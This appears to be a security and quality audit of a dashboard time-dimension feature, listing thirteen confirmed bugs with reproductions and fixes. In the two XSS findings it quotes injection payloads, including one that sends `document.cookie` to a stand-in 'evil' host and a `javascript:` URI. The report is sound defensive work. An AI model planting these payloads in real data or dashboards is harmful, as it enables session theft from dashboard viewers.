# Deep Audit: Time Dimension Detail (TDD)

Scope: `web-common/src/features/dashboards/time-dimension-details` (the TDD table, chart, data store, and the shared `dashboard-utils`/`memoize-metrics-store` helpers it depends on). Method: a multi-lens find phase (security, state, performance, correctness, memory) followed by an adversarial verify phase that traced each candidate source-to-sink and adjusted severity or refuted claims that did not survive.

## Summary

| ID | Title | Severity | Category | Verdict |
|----|-------|----------|----------|---------|
| TIME-1 | Stored XSS: dimension value rendered unescaped into row-header innerHTML | high | security | CONFIRMED |
| TIME-2 | `javascript:`/`data:` URIs pass through `makeHref` into an href (XSS on click) | high | security | CONFIRMED |
| TIME-3 | Global `lastKnownPosition` never reset: scroll lock + cross-dashboard bleed | high | state | CONFIRMED |
| TIME-4 | `memoizeMetricsStore` caches TDD stores forever, capturing the first `ctx` | medium | memory-leak | CONFIRMED |
| TIME-5 | Pinned values missing from table data freeze the TDD table (search / >250 cap) | medium | state | CONFIRMED |
| TIME-6 | Hover triggers 2-3 full virtualized-viewport redraws per cell crossing | medium | performance | CONFIRMED |
| TIME-7 | Entire TDD query/store graph torn down and rebuilt on every `dashboardStore` emission | medium | performance | CONFIRMED |
| TIME-8 | Dimension row query errors render as perpetual loading skeleton | medium | state | CONFIRMED |
| TIME-9 | Absolute Change row shows blank when the comparison bucket value is 0 | medium | correctness | CONFIRMED |
| TIME-10 | Null row totals render as a formatted 0 instead of a null placeholder | medium | correctness | CONFIRMED |
| TIME-11 | Table data prep (250 sparkline SVGs + full transpose) recomputed unmemoized | medium | performance | CONFIRMED |
| TIME-12 | TDDChart rebuilds provider and chart-data query pipeline on every prop identity change | low | performance | CONFIRMED |
| TIME-13 | `memoizeMetricsStore` cache key concatenates names with no delimiter (collision) | low | state | CONFIRMED |

## TIME-1: Stored XSS — dimension value rendered unescaped into row-header innerHTML

**File:** `web-common/src/features/dashboards/time-dimension-details/TDDTable.svelte:262` · **Severity: high** · **Verdict: CONFIRMED**

In `renderRowHeader`, for the dimension-name column (`x === 0`) the value is computed as `total = value.value` (a text dimension value is `NaN`, so the ternary keeps it raw) and then interpolated directly into an HTML string that RegularTable assigns via `th.innerHTML`:

```
const total = value.value !== undefined ? isNaN(Number(value.value)) || x == 0 ? value.value : formatter(Number(value.value)) : "...";
...
return `<div ...><div class="truncate text-xs ...">${total}</div>${link}</div>`;
```

The surrounding `href`/`title` attributes are passed through `escapeHtml`, and the file even carries a comment (lines 248-250) stating that data-derived values must be escaped — but the dimension value text itself is NOT escaped. `value.value` is `row.value`, raw dimension data returned from the OLAP query (`getHeaderDataForRow` in time-dimension-data-store.ts: `{ value: row?.value, uri: row?.uri }`). RegularTable.svelte `style_row_th` then executes `th.innerHTML = maybeVal`. A dimension value such as `<img src=x onerror="fetch('//evil/'+document.cookie)">` in the underlying data source therefore executes attacker script in the dashboard origin whenever the TDD table is viewed — including embedded/iframe dashboards. The source-to-sink path (`getHeaderDataForRow` → `renderRowHeader` → `th.innerHTML`) contains no sanitization; `sanitizeMeasure` only coerces numeric measure cells, never the dimension string.

**Manual reproduction**

1. In a Rill project, ingest or create a source whose dimension column contains a crafted string value, e.g. a row where the category/name column equals `<img src=x onerror="alert(document.domain)">` (a local CSV or model row with that literal string is easiest).
2. Define a metrics view over that source exposing the malicious column as a dimension and at least one measure.
3. Open an explore dashboard on that metrics view in Rill Developer.
4. Open the Time Dimension Detail view: expand a measure, then set the dimension breakdown to the malicious column so its values appear as TDD row headers.
5. Observe the injected markup executes (alert fires) when the TDD table renders the row header for that dimension value.
6. To confirm the escaped-vs-unescaped contrast, inspect the row header `th` in DevTools: the anchor `href`/`title` are HTML-entity encoded while the visible label text contains the live injected element.

**Suggested fix:** Wrap the dimension text in `escapeHtml(...)` before interpolation (e.g. `${x === 0 && typeof total === 'string' ? escapeHtml(total) : total}`), matching the escaping already applied to the href/title. Apply the same to the `x === 1` / `x >= 2` branches where `${total}` string values are interpolated.

## TIME-2: `javascript:`/`data:` URIs pass through `makeHref` into an href (XSS on click)

**File:** `web-common/src/features/dashboards/dashboard-utils.ts:174` · **Severity: high** · **Verdict: CONFIRMED**

`makeHref` classifies a URI only as "has a scheme" vs "no scheme" and returns any scheme-bearing string verbatim, so data-derived values beginning with `javascript:`, `data:`, or `vbscript:` pass through unchanged:

```
const hasProtocol = /^[a-zA-Z][a-zA-Z\d+\-.]*:/.test(uri);
if (!hasProtocol) { return "https://" + uri; } else { return uri; }
```

The value originates from a dimension's server-resolved `__rill_uri` measure (runtime `AnyValue` over the dimension's `uri` expression, `runtime/metricsview/ast.go`), which is entirely data-controlled. In `TDDTable.svelte:247` the result is written into `href="${escapeHtml(href)}"` (line 253); `escapeHtml` only encodes `& < > " '` and does not neutralize the scheme, producing a clickable anchor such as `href="javascript:alert(document.cookie)"`. `data:` top-level navigation is browser-blocked, so `javascript:` is the live vector. The same unsanitized `makeHref` also feeds `LeaderboardRow.svelte` and the pivot table, so the sink is broader than TDD.

**Manual reproduction**

1. Point a metrics view at a data source you can inject rows into (e.g. a DuckDB model over a CSV). Include a text column, say `link`, whose value for one row is the literal string `javascript:alert(document.cookie)`.
2. In the metrics view YAML, add a dimension backed by some column (e.g. `name`) and set its `uri:` property to the malicious column, e.g. `uri: link`.
3. Open an Explore dashboard on this metrics view in Rill Developer.
4. Expand a measure into TDD and set the comparison dimension to the dimension that has `uri` configured, so the row headers render dimension values with the external-link affordance.
5. Hover over the row whose resolved URI is the payload; the external-link icon appears. Inspect it in DevTools: the anchor is `<a href="javascript:alert(document.cookie)" target="_blank" rel="noopener noreferrer">` — the dangerous scheme survived `makeHref` and `escapeHtml`.
6. Click the external-link icon. The `javascript:` scheme executes in the dashboard origin. Also reproducible in the leaderboard and pivot table, and in embedded dashboards.

**Suggested fix:** Add a scheme allowlist in `makeHref`: after computing `uri`, reject/normalize anything whose scheme is not `http`/`https` (return undefined, or fall through to the `https://` prefix path) so `javascript:`, `data:`, `vbscript:` can never reach the href.

## TIME-3: Global `lastKnownPosition` never reset — scroll lock and cross-dashboard bleed

**File:** `web-common/src/features/dashboards/time-dimension-details/TDDTable.svelte:403` · **Severity: high** · **Verdict: CONFIRMED**

`lastKnownPosition` is a module-level writable store (time-dimension-data-store.ts:468) written by every TDDTable instance and never cleared anywhere (TimeDimensionDisplay's `onDestroy` resets hover stores but not this one). Because the restore block in TDDTable.svelte:403-408 only checks that a saved position exists — not that it belongs to the current table — two failures occur on any TDDTable remount (reopening TDD, opening TDD on a different dashboard or metrics view, or a reconcile-driven remount):

1. **Cross-table bleed:** the new table silently auto-scrolls to the position saved by an unrelated previous TDD table.
2. **Scroll lock:** a saved position unreachable in the new table (fewer rows or columns) causes `scrollToCell` to clamp, so `currentPosition` never equals `$lastKnownPosition`, `hasScrolled` stays false, `handlePos` (line 400) never overwrites the store, and — because the reactive block depends on `currentPosition` — every user scroll re-issues `scrollToCell` to the unreachable target, snapping the viewport back. The table remains effectively unscrollable until a full page reload.

The lock does not trigger from in-place grain/comparison changes while TDD stays open (the component is not remounted and `hasScrolled` is already true); it requires closing and reopening TDD or cross-dashboard navigation, both ordinary flows.

**Manual reproduction**

1. Start Rill Developer with a project whose metrics view has a high-cardinality dimension and a time dimension; open its explore dashboard.
2. Expand a measure into TDD and set the comparison to that dimension so the table has hundreds of rows.
3. Scroll down several hundred rows (this writes the row offset into the global `lastKnownPosition` store).
4. Close the TDD view (collapse the measure).
5. Enable a time comparison and reopen TDD for the same measure, so the table now has only a handful of rows — or open a different dashboard's TDD with a small table.
6. Bleed symptom: the new table immediately auto-scrolls on its own instead of starting at the top-left.
7. Lock symptom: try to scroll; the viewport keeps snapping back to the clamped position on every scroll attempt.
8. Confirm the cause: refresh the page (module state resets) and reopen the same TDD — scrolling now works normally.
9. Cross-dashboard bleed variant: after step 3, navigate to a different dashboard (same session, no reload), open any TDD, and observe it auto-scrolls to the first dashboard's saved position.

**Suggested fix:** Reset `lastKnownPosition` in `onDestroy` of the TDD view (or key it by exploreName/measure/comparison), and set `hasScrolled = true` after the first restore attempt (or when the clamped position stops changing) so user scrolling always wins.

## TIME-4: `memoizeMetricsStore` caches TDD stores forever, capturing the first `ctx`

**File:** `web-common/src/features/dashboards/time-dimension-details/time-dimension-data-store.ts:463` · **Severity: medium** · **Verdict: CONFIRMED**

`memoizeMetricsStore` (memoize-metrics-store.ts:10) backs `useTimeDimensionDataStore` and `useDimensionTableData` (time-dimension-data-store.ts:356, 463) with a module-level Map keyed only by `metricsViewName + exploreName` that is never pruned; on first access the inner store captures that call's entire `StateManagers` ctx, including its `runtimeClient`. Consequences:

1. **Memory leak:** every distinct explore visited in a session permanently retains its store graph and captured `StateManagers`.
2. **Stale runtime client:** in web-admin, `RuntimeProvider` is remounted per `{#key host::instanceId}` and disposes its `RuntimeClient` on destroy, so revisiting a previously viewed explore leaves the cached TDD store issuing queries through the old disposed client whose JWT is frozen; once that JWT nears its 15-minute TTL, TDD requests abort (`AbortError` in `waitForFreshJwt`) while the rest of the dashboard uses the fresh client.
3. **Cross-project collision:** the cache key is not scoped by instanceId, so two projects with identically named metrics view + explore reuse each other's cached ctx and query the wrong runtime.

The same pattern also affects `useTimeControlStore`, `useTimeSeriesDataStore`, and `usePivotForExplore`.

**Manual reproduction**

Stale-client breakage (web-admin / Rill Cloud):
1. Open a project's explore dashboard and expand a measure into TDD; note requests succeed.
2. Navigate to a different project (or switch branch / toggle View As so `host::instanceId` changes) — this tears down `RuntimeProvider` and disposes the first `RuntimeClient`.
3. Navigate back to the original explore and re-open the same TDD view.
4. In DevTools Network, compare the `Authorization` header on TDD aggregation/timeseries requests vs. other panels: TDD requests carry the old frozen JWT.
5. Keep the tab open until the frozen JWT nears its 15-minute TTL: TDD requests start failing (`AbortError` from the disposed-client check in `waitForFreshJwt`) while other panels keep working.

Memory leak (Developer or Cloud):
1. Open DevTools > Memory and take a heap snapshot.
2. Visit 8-10 distinct explore dashboards, expanding TDD on each; navigate away from all of them.
3. Take another snapshot and search for retained `StateManagers` / derived-store objects: one graph per visited explore remains reachable from the module-level Map and is never released.

**Suggested fix:** Key the cache by ctx identity as well (e.g. a `WeakMap` keyed on the `StateManagers` instance with an inner name map), or evict entries when the owning `StateManagersProvider` is destroyed.

## TIME-5: Pinned values missing from table data freeze the TDD table

**File:** `web-common/src/features/dashboards/time-dimension-details/time-dimension-data-store.ts:120` · **Severity: medium** · **Verdict: CONFIRMED**

In `prepareDimensionData` (lines 113-120), pinned rows are located by `findIndex` in the fetched top list, and the "return if computing on old data" guard bails with `undefined` if any pinned selected value is missing. This guard was meant for transient stale data, but two steady states legitimately produce a missing pinned value:

1. **TDD search:** the top-list query applies the search text (`getDimensionFilterWithSearch`) while `selectedValues` ignores it, so searching for text that does not match every pinned value permanently yields `-1`.
2. **Top-250 cap:** because the compared dimension's own filter is stripped from the top-list query (`getFiltersForOtherDimensions`), the query returns the global top 250 values by the sorted measure, so any pinned value ranked outside the top 250 is permanently missing.

In both cases the store emits `{ isFetching: false, comparing: "dimension", data: undefined }` indefinitely: `TDDHeader` shows a perpetual loading spinner (`isFetching` is derived from `!data.columnHeaderData`) and the table keeps rendering the stale `timeDimensionDataCopy`, inconsistent with the active search/filters, until the user clears the search or removes the pin. The originally reported exclude-mode trigger is refuted: the dimension's own NIN filter is removed from the top-list query, so excluded values still appear in the fetched data (when within the top 250) and toggling exclude alone does not freeze the table.

**Manual reproduction**

1. Start Rill Developer on a project with an explore dashboard whose metrics view has a dimension with several distinct values (e.g. an ad-bids demo).
2. Open the explore dashboard and expand a measure into TDD.
3. Pick a comparison dimension from the dimension selector.
4. Select two dimension values (e.g. `Apple` and `Google`), both included in the filter pill.
5. Click the pin icon to pin the selected values to the top.
6. In the TDD search box, type text that matches only one pinned value, e.g. `App` (matches `Apple` but not `Google`).
7. Observe: the table never updates to the search results; the header shows a perpetual spinner; the table keeps displaying stale pre-search rows. Clearing the search or clicking unpin restores normal behavior.
8. Alternate trigger (no search): on a dimension with more than 250 distinct values, select and pin a value whose measure total ranks below the top 250; the table freezes the same way.

**Suggested fix:** Instead of returning `undefined` when a pinned value is not found, drop the missing values from the pinned set (filter out `-1` indices) and fall back to unpinned ordering; additionally reset `tdd.pinIndex` in `toggleDimensionFilterMode`.

## TIME-6: Hover triggers 2-3 full virtualized-viewport redraws per cell crossing

**File:** `web-common/src/features/dashboards/time-dimension-details/TDDTable.svelte:378` · **Severity: medium** · **Verdict: CONFIRMED**

In `handleMouseHover`, every mouse transition across an element boundary fires a `mouseout` (which unconditionally resets `rowIdxHover`/`colIdxHover` to `undefined` and calls `pivot.draw()`) immediately followed by a `mouseover` (which sets the new indices and draws again); the `&&` update gate only passes because the mouseout reset makes both indices change. Each `draw()` takes regular-table's full-redraw branch and runs Rill's `styleListener`, which unconditionally rewrites `innerHTML` for every visible `td` and `th` — including re-parsing per-row sparkline SVG strings in row headers — even when values are unchanged. This yields at least 2 full virtualized-viewport DOM rewrites per cell crossing (more when crossing nested elements inside row headers). A third draw per settled hover position comes from the table→`hoverIndex`→props round trip, though that leg is softened by a 50 ms trailing debounce on `onHighlight`. Separately, hovering the TDD chart writes `hoverIndex` per Vega hover-signal change with no debounce, driving one full table redraw per time-bucket crossed. On large tables (hundreds of columns at hourly grain, ~600 visible cells) this produces thousands of `innerHTML` writes per second during hover sweeps and visible frame drops.

**Manual reproduction**

1. Open a project with a metrics view that has a high-cardinality dimension and hourly (or finer) time grain, and select a long time range so the TDD table has hundreds of columns.
2. Open an explore dashboard, expand a measure into TDD, and pick a comparison dimension with many values so the table shows a full viewport of rows.
3. Open Chrome DevTools > Performance and start recording; optionally enable "Paint flashing" in the Rendering panel.
4. Sweep the mouse horizontally across a table row at normal speed.
5. Observe two (or more) regular-table draw/style-listener tasks per cell boundary crossed, each iterating every visible `td`/`th` and setting `innerHTML`; frame times exceed 16 ms. With paint flashing on, the entire visible table repaints on every hover move rather than just the two affected cells.
6. Move the mouse across the time-series chart above the table and observe one full table redraw per time bucket crossed (undebounced).
7. DOM-level confirmation: run a `MutationObserver` on the regular-table element; sweeping across ~10 cells produces 20+ full-viewport `innerHTML` rewrites instead of ~40 targeted class toggles.

**Suggested fix:** Coalesce mouseout/mouseover into one draw per animation frame (requestAnimationFrame-throttled `pivot.draw()`), change the gate to `||`, and in the render callbacks toggle only highlight classes instead of rewriting `innerHTML` when the cell value is unchanged.

## TIME-7: Entire TDD query/store graph torn down and rebuilt on every `dashboardStore` emission

**File:** `web-common/src/features/dashboards/time-dimension-details/time-dimension-data-store.ts:343` · **Severity: medium** · **Verdict: CONFIRMED**

In `createDimensionTableData`, the pipeline is wrapped in `derived(ctx.dashboardStore, ...)` whose callback returns the inner subscription as cleanup, so every `dashboardStore` emission — including pin toggles (`setPinIndex`) and chart-type switches (`setTDDChartType`) that do not affect any query input, since the store mutates in place and svelte's `safe_not_equal` always re-emits objects — tears down and rebuilds the entire query graph: the 250-value top-list observer, two timeseries observers, and up to 5 batched aggregation observers. Because TanStack Query serves cached results, no network requests are re-issued, but `transformAggregateDimensionData` re-allocates an O(values × timepoints) deep-copied grid per batch and `prepareTimeSeries` re-runs per-point timezone conversion for all values, producing a main-thread stall on large TDD tables (up to ~180k+ object allocations per pass at 250 values × 720 hourly points). The outer wrapper is redundant (only `tdd.expandedMeasureName` is read) but is not the sole cause: `getDimensionValueTimeSeries` itself derives directly from `ctx.dashboardStore` (multiple-dimension-queries.ts:337) and rebuilds its batched queries and re-runs all transforms on every emission, so a fix must deduplicate inputs at both levels (the `isScrubbing` early-return already guards the scrub-drag case for transforms, though observers are still rebuilt).

**Manual reproduction**

1. Start Rill Developer with a project whose model has a dimension with at least 250 distinct values and an hourly-grain timestamp spanning 30+ days.
2. Open the explore dashboard and select a time range that resolves to hourly grain over a long window.
3. Set the high-cardinality dimension as the comparison dimension.
4. Expand a measure to open TDD and wait for the table to finish loading.
5. Open DevTools Performance, start recording; open the Network tab filtered to `aggregation`.
6. Click the pin icon, or switch the chart type (line to bar).
7. Stop recording. Observe a long main-thread task on each click whose flame graph contains `transformAggregateDimensionData` and `prepareTimeSeries` re-executing per batch, while the Network tab shows no new aggregation requests — confirming the cached dataset is re-transformed for a state change unrelated to the query inputs.

**Suggested fix:** Derive only the deduplicated `expandedMeasureName` (a derived store with an equality check) and rebuild `getDimensionValueTimeSeries` only when the measure name actually changes; inside `getDimensionValueTimeSeries`, cache transformed batch results keyed by batch data identity so completed batches are not re-transformed when a sibling batch updates.

## TIME-8: Dimension row query errors render as perpetual loading skeleton

**File:** `web-common/src/features/dashboards/time-dimension-details/time-dimension-data-store.ts:380` · **Severity: medium** · **Verdict: CONFIRMED**

`createTimeDimensionDataStore` propagates errors only from the totals time series (`if (timeSeries?.isError) return { isFetching: false, isError: true }`). The per-dimension batched aggregation queries expose no error state: an errored batch settles with `isFetching: false` and `data: undefined` (the global query client disables refetch on mount/focus/reconnect and retries only network errors, max 2), so `batchedAggTimeSeriesData[i]?.data?.data || []` yields `[]`, `transformAggregateDimensionData` fills every cell with `undefined` (utils.ts:155), `sanitizeMeasure` passes `undefined` through, and RegularTable renders each `undefined` body cell as an animated `LOADING_CELL` shimmer. With a comparison dimension selected in TDD, a failed batch (server error, 429, exhausted network retries) leaves up to 50 dimension rows showing loading shimmer indefinitely, with row headers and totals rendering normally, no spinner, no error banner, and no self-recovery short of a full reload.

**Manual reproduction**

1. Start Rill Developer with any project that has an explore dashboard whose metrics view includes at least one dimension.
2. Open the explore dashboard and expand a measure into TDD.
3. Select a comparison dimension so the table shows per-dimension-value rows.
4. In DevTools > Network, find the POST to `/metrics-views/{name}/aggregation` — the batched per-dimension request (body contains the dimension, the time dimension with a `timeGrain`, and an `in` filter listing up to 50 values). Right-click > "Block request URL".
5. Trigger a refetch of that query (type in the dimension search and clear it, or change the time range and change it back) so the blocked request fails. (Blocked requests surface as network errors, retried twice with backoff before settling; a server 500/429 fails immediately.)
6. Observe: the dimension rows' body cells render as animated gray shimmer indefinitely, while the Total row and row headers render normally. No error message or spinner appears; unblocking the URL does not fix the table until a full reload or another state change re-triggers the query.

**Suggested fix:** Propagate an error flag from `getDimensionValueTimeSeries` (add `isError` to `DimensionDataItem` or the store result) and surface it in `createTimeDimensionDataStore` the same way as `timeSeries?.isError`.

## TIME-9: Absolute Change row shows blank when the comparison bucket value is 0

**File:** `web-common/src/features/dashboards/time-dimension-details/time-dimension-data-store.ts:314` · **Severity: medium** · **Verdict: CONFIRMED**

In `prepareTimeData` (lines 306-320), the Absolute Change row uses a truthiness guard on the comparison value: `comparisonValue && currentValue !== undefined && currentValue !== null ? currentValue - comparisonValue : null`. When the comparison bucket value is exactly 0, `0 && ...` is falsy, so the change is set to `null`, and RegularTable renders `null` as the muted NULL_CELL "-". The result is internally contradictory: the Previous row correctly shows 0 (it uses `sanitizeMeasure` with no truthiness guard) and Current shows e.g. 42, yet Absolute Change shows "-" instead of 42. The same guard on the Percentage Change row is defensible as a division-by-zero guard, but subtraction is well-defined for 0; the guard appears copy-pasted. A secondary inconsistency: `comparisonValue` is a raw type cast rather than being passed through `sanitizeMeasure` like `currentValue`.

**Manual reproduction**

1. In Rill Developer, create a model with a dimension value whose measure column is entirely NULL/zero for a bucket, e.g. a SQL model: `SELECT * FROM (VALUES ('a', 1, TIMESTAMP '2024-01-01'), ('a', 2, TIMESTAMP '2024-01-02'), ('b', 0, TIMESTAMP '2024-01-01'), ('b', 42, TIMESTAMP '2024-01-02')) t(dim, val, event_time)`.
2. Create a metrics view with `timeseries: event_time`, a dimension on `dim`, and a measure `sum(val)`, then an explore dashboard.
3. Open the explore dashboard, set the time range to cover the data, and enable time comparison (e.g. "Previous period").
4. Expand the measure into TDD.
5. Locate a column where the "Previous" row shows 0 and the current-period row shows 42.
6. Observe the "Absolute Change" row for that column shows a muted "-" instead of 42, while a column whose previous value is nonzero renders normally.

**Suggested fix:** Use explicit null checks for the absolute change: `const comp = sanitizeMeasure(v[`comparison.${measureName}`]); const change = comp !== null && comp !== undefined && currentValue !== null && currentValue !== undefined ? currentValue - comp : null;`

## TIME-10: Null row totals render as a formatted 0 instead of a null placeholder

**File:** `web-common/src/features/dashboards/time-dimension-details/TDDTable.svelte:212` · **Severity: medium** · **Verdict: CONFIRMED**

Row-total header cells render a formatted zero instead of a null placeholder when the measure aggregates to SQL NULL. Upstream, totals are stringified with `row?.total?.toString() ?? ""` (time-dimension-data-store.ts:65; same pattern at 231/245/254), so a NULL total becomes the empty string. In `renderRowHeader` (lines 210-215), `Number("")` is 0 and `isNaN(0)` is false, so the cell renders `formatter(0)` (e.g. "$0") for the `x=1` total column. RegularTable's null replacement (`r?.[1]?.value === null` → NULL_CELL) never fires because the value is `""` rather than `null`, while body cells for the same row correctly show the "-" null placeholder — making the total visibly inconsistent with the row's cells and indistinguishable from a genuine zero. The reporter's secondary claim of a loading flash is refuted: the TDD data store returns `{ isFetching: true }` until the totals query resolves and `TimeDimensionDisplay` keeps a copy of the last complete data during transient states, so the table never renders with unresolved totals. The bug is limited to genuinely NULL aggregate totals.

**Manual reproduction**

1. In Rill Developer, create a model with a dimension value whose measure column is entirely NULL, e.g. `SELECT * FROM (VALUES ('a', 1, TIMESTAMP '2024-01-01'), ('a', 2, TIMESTAMP '2024-01-02'), ('b', NULL, TIMESTAMP '2024-01-01'), ('b', NULL, TIMESTAMP '2024-01-02')) t(dim, val, event_time)`.
2. Create a metrics view on this model with `timeseries: event_time`, a dimension on `dim`, and a measure `sum(val)` with a currency format, then an explore dashboard.
3. Open the explore dashboard, set the time range to cover January 2024, and expand the measure into TDD.
4. Select `dim` as the comparison dimension so each value appears as a row.
5. Observe row `b`: its per-timestamp body cells correctly show "-", but its total column shows a formatted zero such as "$0.00" instead of a null placeholder.
6. Variant: filter the dashboard to `dim = 'b'` and open TDD without a comparison dimension: the "Total" header row shows "$0.00" even though the range total is NULL.

**Suggested fix:** Treat empty string as missing in `renderRowHeader` (`value.value === "" ? "..."`) or keep `null` instead of `""` upstream so RegularTable's NULL_CELL path handles it.

## TIME-11: Table data prep (250 sparkline SVGs + full transpose) recomputed unmemoized

**File:** `web-common/src/features/dashboards/time-dimension-details/time-dimension-data-store.ts:160` · **Severity: medium** · **Verdict: CONFIRMED**

`createTimeDimensionDataStore` derives from six stores (`dashboardStore`, `validSpecStore`, time controls, time series, dimension table data, selected values) and re-runs `prepareDimensionData` on every emission of any of them, with no memoization at any level (`memoizeMetricsStore` only caches the store instance per metrics view, not computed results). `prepareDimensionData` rebuilds the entire table payload from scratch: `createSparkline` generates an SVG path string over each row's full time series for up to 250 rows, and `transposeArray` performs an O(rows × columns) copy (~180k cells for 250 rows at hourly grain over 30 days). Because `tdd.pinIndex`, dimension-value selections (filters), and the chart scrub range all live in `dashboardStore`, a pin toggle, a row selection click, or every mousemove of a chart scrub drag each trigger a full rebuild even though the underlying series data is unchanged, and the fresh `TableData` object identity then fires TDDTable's reactive block (`tableData?.selectedValues; pivot?.draw();`) causing a complete regular-table redraw. Scrubbing is the worst case since it emits `dashboardStore` updates continuously during the drag.

**Manual reproduction**

1. In Rill Developer, open a project with a high-cardinality dimension (≥ 250 values) and hourly-grain time data spanning at least 30 days.
2. Open the explore dashboard, select a 30-day (or longer) time range with hour grain, pick a comparison dimension with ≥ 250 values, then expand a measure into TDD so the table shows ~250 rows and ~720 time columns.
3. Open DevTools > Performance and start recording.
4. Rapidly click dimension values to select/deselect, toggle the pin icon several times, and drag a scrub selection across the time series chart.
5. Stop recording. Each pin toggle and selection click shows a long task containing `prepareDimensionData` (repeated `createSparkline` calls and `transposeArray`) followed by a full regular-table draw; during the scrub drag these tasks repeat per pointer event. Pin toggles and row clicks feel sluggish and the whole table repaints; scrubbing is janky while TDD is visible.

**Suggested fix:** Memoize `createSparkline` output per row (keyed by the row's data reference) and cache the transposed body keyed by `(data, totalsData, isAllTime)` identity, so pin/selection changes only reorder precomputed rows instead of regenerating sparklines and re-transposing.

## TIME-12: TDDChart rebuilds provider and chart-data query pipeline on every prop identity change

**File:** `web-common/src/features/dashboards/time-dimension-details/charts/TDDChart.svelte:131` · **Severity: low** · **Verdict: CONFIRMED**

The provider/query pipeline is rebuilt on every prop identity change: `$: cartesianSpec = createTDDCartesianSpec(..., dimensionValues, dimensionData, ...)` produces a new spec whenever `dimensionData` changes identity, and `MeasureChart.svelte` rebuilds `dimensionData` via `buildDimensionSeriesData(...)` on every emission of any of up to four TanStack query stores, including `isFetching` flips — roughly 4-8 fresh array identities during one load with comparison enabled. Each new spec triggers `provider = new CHART_CONFIG[componentChartType].provider(readable(cartesianSpec), {})`, which cascades into `provider.createChartDataQuery(...)` — eagerly constructing three new TanStack `QueryObserver`s per rebuild — and a fresh `getChartData` derived pipeline. Network duplication is prevented by the global `refetchOnMount: false` default, and, contrary to the original finding, there is no visible re-render flicker: `Chart.svelte` deep-equality memoizes the generated Vega spec (JSON.stringify comparison) so the Vega view is not recreated on same-spec re-emissions. The actual cost is CPU/GC churn: repeated spec generation, full-spec JSON.stringify comparisons, observer construction/subscription cycling, and derived-store re-subscription several times per load. This path is the default whenever a TDD dimension comparison is active (`resolveEffectiveChartType` forces STACKED_BAR).

**Manual reproduction**

1. Start Rill Developer on a project with an explore dashboard that has a time series and at least one dimension.
2. Open the explore dashboard, expand a measure into TDD, and choose a comparison dimension; select or pin ~5-10 dimension values so a dimension comparison is active.
3. The issue is not user-visible; observe it in DevTools: in Sources, open `TDDChart.svelte` and set a logpoint on the provider construction (line ~131) and on `CartesianChartProvider.createChartDataQuery`.
4. Change the time range or toggle time comparison to trigger a reload.
5. Observe the provider constructor and `createChartDataQuery` fire roughly 4-8 times during the single load (once per emission of each underlying query store, including `isFetching` flips), each eagerly constructing three new `QueryObserver`s and a new `getChartData` pipeline.
6. Confirm the mitigations: the Network tab shows no duplicated aggregation requests, and the Vega chart does not remount on identity-only rebuilds because `Chart.svelte` deep-equality memoizes the generated spec.

**Suggested fix:** Recreate the provider only when `componentChartType` changes, and feed spec changes through a single writable store passed to the provider (update it in place) instead of constructing a new provider and query per spec identity; similarly keep one `timeAndFilterStore` writable updated via `$:` rather than replacing the store object.

## TIME-13: `memoizeMetricsStore` cache key concatenates names with no delimiter (collision)

**File:** `web-common/src/features/dashboards/state-managers/memoize-metrics-store.ts:14` · **Severity: low** · **Verdict: CONFIRMED**

`memoizeMetricsStore` (used by the TDD stores `useTimeDimensionDataStore`/`useDimensionTableData`, plus `useTimeSeriesDataStore`, `usePivotForExplore`, and `useTimeControlStore`) keys a never-evicted module-level Map by `metricsName + exploreName` with no delimiter. Distinct (metricsView, explore) pairs can therefore produce identical keys (e.g. `"sales"+"report"` vs `"sale"+"sreport"`). Because each cached store closes over the `StateManagers` ctx of the first dashboard that populated the key, a colliding second dashboard in the same SPA session subscribes to a store bound to the first dashboard's ctx and displays the other dashboard's time-series/dimension data. The collision is entirely name-controlled.

**Manual reproduction**

1. In a Rill Developer project, create two metrics views whose names are a concatenation-ambiguous pair, e.g. `sales` (table A) and `sale` (a different table B with visibly different data).
2. Create explore dashboard `report.yaml` with `metrics_view: sales`, and `sreport.yaml` with `metrics_view: sale`. Both pairs concatenate to `"salesreport"`.
3. Open the `report` explore, expand a measure into TDD, and note the chart/table values (table A).
4. Without reloading, navigate (SPA navigation) to the `sreport` explore and open its TDD view.
5. Observe the TDD chart/table shows data for the `sales` metrics view (table A) instead of `sale` (table B). A full browser reload clears the module-level Map and restores correct data.

**Suggested fix:** Use an unambiguous key such as `JSON.stringify([metricsName, exploreName])` or join with a delimiter that cannot appear in resource names (e.g. `metricsName + " " + exploreName`).

## Refuted findings

No findings were refuted outright. Two verdicts corrected specific sub-claims within otherwise-confirmed findings: TIME-5's originally reported exclude-mode trigger was refuted (the dimension's own NIN filter is stripped from the top-list query, so excluded values still appear), and TIME-10's claimed "$0 flash while loading" was refuted (the store gates on `isFetching` and holds a data copy during transient states).
